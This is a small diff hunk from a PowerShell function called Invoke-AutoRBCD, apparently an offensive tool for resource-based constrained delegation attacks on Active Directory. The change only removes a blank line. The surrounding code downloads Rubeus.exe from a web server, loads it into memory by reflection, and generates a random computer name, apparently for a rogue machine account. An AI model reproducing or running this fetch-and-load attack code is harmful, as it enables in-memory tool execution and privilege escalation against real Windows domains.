@@ -37,7 +37,6 @@ function Invoke-AutoRBCD{
 	$ruby = (New-Object System.Net.WebClient).DownloadData("http://$WebServer/Rubeus.exe")
 	$assem = [System.Reflection.Assembly]::Load($ruby)
 
-
 	# generate a random computer name
 	$MachineName = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {[char]$_})
 
